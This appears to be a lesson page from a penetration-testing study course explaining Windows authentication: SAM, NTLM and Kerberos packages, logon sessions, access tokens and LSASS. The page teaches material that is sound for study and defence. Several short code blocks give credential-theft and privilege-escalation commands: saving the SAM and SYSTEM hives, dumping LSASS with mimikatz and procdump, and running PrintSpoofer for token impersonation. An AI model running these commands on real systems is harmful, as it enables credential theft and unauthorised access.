---
title: "Windows Authentication"
topic: "windows-authentication"
tags: [windows, authentication, ntlm, kerberos, sam, active-directory, tokens, lsass]
difficulty: intermediate
day: 47
layout: default
parent: Topics
nav_order: 47
---

# Windows Authentication

## What You Will Learn
- How Windows authenticates local and domain users
- What authentication packages, logon sessions, and access tokens are
- How NTLM and Kerberos authentication work
- What LSASS does and why it is targeted by attackers

## What Is It?

Windows authentication is the process by which Windows verifies the identity of a user and grants them access to the system. There are two main types: **local** and **domain** authentication.

Understanding Windows authentication is fundamental for penetration testing, Active Directory attacks, and lateral movement.

## Authentication Types

Windows authentication can be grouped as:

- **Interactive Authentication**: Windows asks the user for credentials (keyboard input)
- **Non-Interactive Authentication**: The user does not specify credentials — used for services, network logons, and pass-the-hash attacks

### Authenticating with a Local User

When a local user authenticates, Windows checks the credentials against the locally stored password hashes in the **SAM** (Security Account Manager) database.

```bash
# Location of SAM
C:\Windows\System32\config\SAM

# SAM is locked while Windows is running.
# Extract offline:
reg save hklm\sam sam.reg
reg save hklm\system system.reg
```

### Authenticating with a Domain User

A domain user belongs to an Active Directory domain. When they authenticate, their credentials are compared against what is stored in the Domain Controller. Remote logins require administrative privileges.

## Authentication Packages

Authentication packages are DLLs loaded by LSASS that handle the actual authentication logic. They verify credentials against a credential store.

| Package | Description |
|---------|-------------|
| **MSV1_0** | Handles local (SAM) NTLM authentication |
| **Kerberos** | Handles Active Directory Kerberos authentication |
| **WDigest** | Older package — stores plaintext credentials in memory (disabled by default in Windows 8.1+) |
| **NTLM** | Challenge-response authentication over the network |

## Logon Sessions

A **logon session** is created when a user successfully authenticates. Each session has a unique **Locally Unique Identifier (LUID)** and is associated with security tokens.

```powershell
# List active logon sessions (requires elevated access)
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}
```

Logon types:

| Type | Description |
|------|-------------|
| 2 | Interactive (local console) |
| 3 | Network (SMB, mapped drives) |
| 4 | Batch (scheduled tasks) |
| 5 | Service |
| 10 | RemoteInteractive (RDP) |

## Access Tokens

When a user authenticates, Windows creates an **access token** — a kernel object that describes the security context of the process.

- **Primary Token (Process Token)**: Assigned to every process. Represents the user who started the process.
- **Impersonation Token (Thread Token)**: Allows a thread to temporarily act as a different user (e.g., a service acting on behalf of a client).

```powershell
# View current user and privileges
whoami /all

# Check token privileges (look for SeImpersonatePrivilege)
whoami /priv
```

### Token Abuse

If you have `SeImpersonatePrivilege` (common for service accounts), you can impersonate privileged tokens:

```bash
# Tools that exploit token impersonation:
# - PrintSpoofer
# - JuicyPotato
# - GodPotato
.\PrintSpoofer.exe -i -c cmd.exe
```

## LSASS

The **Local Security Authority Subsystem Service (LSASS)** process (`lsass.exe`) handles authentication, stores credentials in memory, and manages security tokens.

LSASS is a primary target for credential dumping:

```bash
# Dump LSASS memory with mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Create a minidump of LSASS (no AV needed)
tasklist | findstr lsass
procdump.exe -ma lsass.exe lsass.dmp
```

## Resources

- [HackTricks — Windows Authentication](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [TryHackMe — Windows Authentication](https://tryhackme.com/room/windowslocalpersistence)
- [Microsoft Docs — Authentication Packages](https://learn.microsoft.com/en-us/windows/win32/secauthn/authentication-packages)
- [Mimikatz — Credential Extraction](https://github.com/gentilkiwi/mimikatz)
